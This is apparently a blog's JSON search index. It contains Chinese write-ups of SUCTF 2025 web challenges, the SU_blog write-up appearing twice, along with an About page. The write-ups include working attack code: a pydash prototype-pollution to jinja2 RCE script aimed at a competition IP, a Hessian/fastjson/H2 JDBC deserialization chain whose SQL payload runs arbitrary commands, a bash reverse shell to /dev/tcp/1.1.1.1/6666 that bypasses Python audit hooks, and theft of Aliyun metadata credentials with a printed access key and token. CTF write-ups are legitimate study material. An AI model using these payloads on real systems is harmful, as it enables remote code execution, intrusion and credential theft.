format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"}]